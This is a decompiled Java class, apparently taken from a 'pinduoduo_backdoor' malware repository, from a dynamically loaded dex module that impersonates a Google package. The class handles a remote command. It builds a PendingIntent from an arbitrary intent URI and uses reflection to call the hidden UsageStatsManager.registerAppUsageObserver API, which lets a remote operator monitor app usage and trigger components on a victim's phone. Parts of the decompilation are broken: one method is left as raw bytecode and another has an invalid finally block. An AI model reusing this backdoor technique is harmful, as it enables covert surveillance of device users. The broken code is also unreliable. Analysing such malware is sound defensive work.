package com.google.android.sd.biz_dynamic_dex.app_usage_observer;

import android.app.PendingIntent;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.os.Build;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.lang.reflect.Method;
import java.util.concurrent.TimeUnit;
import org.json.JSONArray;
import org.json.JSONObject;

public class AppUsageObserver extends DynamicCmdExecutor {
  private int CMD = 75;
  
  private void handleResult(Context paramContext, boolean paramBoolean, String paramString1, String paramString2) throws Exception {
    CmdData cmdData1;
    CmdData cmdData2 = new CmdData(this.CMD, paramString2, "client");
    if (paramBoolean) {
      cmdData1 = Utils.buildSucceedRespData(cmdData2, new JSONObject("{\"success\":true}"), null);
    } else {
      cmdData1 = Utils.buildErrorRespData(cmdData2, (String)cmdData1, null);
    } 
    CmdHandler.dispatch(paramContext, cmdData1);
  }
  
  private void registerAppUsageObserver(Context paramContext, int paramInt, String[] paramArrayOfString, long paramLong, PendingIntent paramPendingIntent) throws Exception {
    if (Build.VERSION.SDK_INT >= 23) {
      UsageStatsManager usageStatsManager = (UsageStatsManager)paramContext.getSystemService(UsageStatsManager.class);
      for (Method method : usageStatsManager.getClass().getDeclaredMethods()) {
        if (method.getName().equals("registerAppUsageObserver")) {
          method.setAccessible(true);
          method.invoke(usageStatsManager, new Object[] { Integer.valueOf(paramInt), paramArrayOfString, Long.valueOf(paramLong), TimeUnit.SECONDS, paramPendingIntent });
        } 
      } 
      return;
    } 
    throw new Exception("invalid os version");
  }
  
  private void work(Context paramContext, JSONObject paramJSONObject) throws Exception {
    // Byte code:
    //   0: aload_2
    //   1: ldc 'observerId'
    //   3: invokevirtual getInt : (Ljava/lang/String;)I
    //   6: istore #5
    //   8: aload_2
    //   9: ldc 'observedEntities'
    //   11: invokevirtual getJSONArray : (Ljava/lang/String;)Lorg/json/JSONArray;
    //   14: astore #11
    //   16: aload #11
    //   18: invokevirtual length : ()I
    //   21: anewarray java/lang/String
    //   24: astore #10
    //   26: iconst_0
    //   27: istore #4
    //   29: iconst_0
    //   30: istore_3
    //   31: iload_3
    //   32: aload #11
    //   34: invokevirtual length : ()I
    //   37: if_icmpge -> 57
    //   40: aload #10
    //   42: iload_3
    //   43: aload #11
    //   45: iload_3
    //   46: invokevirtual getString : (I)Ljava/lang/String;
    //   49: aastore
    //   50: iload_3
    //   51: iconst_1
    //   52: iadd
    //   53: istore_3
    //   54: goto -> 31
    //   57: aload_2
    //   58: ldc 'timeLimitInSec'
    //   60: invokevirtual getLong : (Ljava/lang/String;)J
    //   63: lstore #8
    //   65: aload_2
    //   66: ldc 'pendingIntent'
    //   68: invokevirtual getJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   71: astore #11
    //   73: aload #11
    //   75: ldc 'intentStr'
    //   77: invokevirtual getString : (Ljava/lang/String;)Ljava/lang/String;
    //   80: aload #11
    //   82: ldc 'intentParseFlag'
    //   84: invokevirtual getInt : (Ljava/lang/String;)I
    //   87: invokestatic parseUri : (Ljava/lang/String;I)Landroid/content/Intent;
    //   90: astore_2
    //   91: aload #11
    //   93: ldc 'requestCode'
    //   95: invokevirtual getInt : (Ljava/lang/String;)I
    //   98: istore #6
    //   100: aload #11
    //   102: ldc 'pendingIntentFlag'
    //   104: invokevirtual getInt : (Ljava/lang/String;)I
    //   107: istore #7
    //   109: aload #11
    //   111: ldc 'type'
    //   113: invokevirtual getString : (Ljava/lang/String;)Ljava/lang/String;
    //   116: astore #11
    //   118: aload #11
    //   120: invokevirtual hashCode : ()I
    //   123: pop
    //   124: aload #11
    //   126: invokevirtual hashCode : ()I
    //   129: lookupswitch default -> 172, -1628481013 -> 231, -1273953665 -> 213, 421933189 -> 195, 549395260 -> 177
    //   172: iconst_m1
    //   173: istore_3
    //   174: goto -> 247
    //   177: aload #11
    //   179: ldc 'getForegroundService'
    //   181: invokevirtual equals : (Ljava/lang/Object;)Z
    //   184: ifne -> 190
    //   187: goto -> 172
    //   190: iconst_3
    //   191: istore_3
    //   192: goto -> 247
    //   195: aload #11
    //   197: ldc 'getActivity'
    //   199: invokevirtual equals : (Ljava/lang/Object;)Z
    //   202: ifne -> 208
    //   205: goto -> 172
    //   208: iconst_2
    //   209: istore_3
    //   210: goto -> 247
    //   213: aload #11
    //   215: ldc 'getService'
    //   217: invokevirtual equals : (Ljava/lang/Object;)Z
    //   220: ifne -> 226
    //   223: goto -> 172
    //   226: iconst_1
    //   227: istore_3
    //   228: goto -> 247
    //   231: iload #4
    //   233: istore_3
    //   234: aload #11
    //   236: ldc 'getBroadcast'
    //   238: invokevirtual equals : (Ljava/lang/Object;)Z
    //   241: ifne -> 247
    //   244: goto -> 172
    //   247: iload_3
    //   248: tableswitch default -> 280, 0 -> 367, 1 -> 354, 2 -> 341, 3 -> 285
    //   280: aconst_null
    //   281: astore_2
    //   282: goto -> 380
    //   285: getstatic android/os/Build$VERSION.SDK_INT : I
    //   288: bipush #26
    //   290: if_icmplt -> 306
    //   293: aload_1
    //   294: iload #6
    //   296: aload_2
    //   297: iload #7
    //   299: invokestatic getForegroundService : (Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
    //   302: astore_2
    //   303: goto -> 351
    //   306: new java/lang/StringBuilder
    //   309: dup
    //   310: invokespecial <init> : ()V
    //   313: astore_1
    //   314: aload_1
    //   315: ldc 'getForegroundService is invalid on os : '
    //   317: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   320: pop
    //   321: aload_1
    //   322: getstatic android/os/Build$VERSION.SDK_INT : I
    //   325: invokevirtual append : (I)Ljava/lang/StringBuilder;
    //   328: pop
    //   329: new java/lang/Exception
    //   332: dup
    //   333: aload_1
    //   334: invokevirtual toString : ()Ljava/lang/String;
    //   337: invokespecial <init> : (Ljava/lang/String;)V
    //   340: athrow
    //   341: aload_1
    //   342: iload #6
    //   344: aload_2
    //   345: iload #7
    //   347: invokestatic getActivity : (Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
    //   350: astore_2
    //   351: goto -> 380
    //   354: aload_1
    //   355: iload #6
    //   357: aload_2
    //   358: iload #7
    //   360: invokestatic getService : (Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
    //   363: astore_2
    //   364: goto -> 351
    //   367: aload_1
    //   368: iload #6
    //   370: aload_2
    //   371: iload #7
    //   373: invokestatic getBroadcast : (Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;
    //   376: astore_2
    //   377: goto -> 351
    //   380: aload_0
    //   381: aload_1
    //   382: iload #5
    //   384: aload #10
    //   386: lload #8
    //   388: aload_2
    //   389: invokespecial registerAppUsageObserver : (Landroid/content/Context;I[Ljava/lang/String;JLandroid/app/PendingIntent;)V
    //   392: return
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    JSONObject jSONObject = new JSONObject(paramString);
    paramString = jSONObject.optString("uuid");
    try {
      int i;
      JSONArray jSONArray = jSONObject.getJSONArray("observers");
      return;
    } finally {
      jSONObject = null;
      handleResult(paramContext, false, jSONObject.getMessage(), paramString);
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\1a68d982e02fc22b464693a06f528fac-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\app_usage_observer\AppUsageObserver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */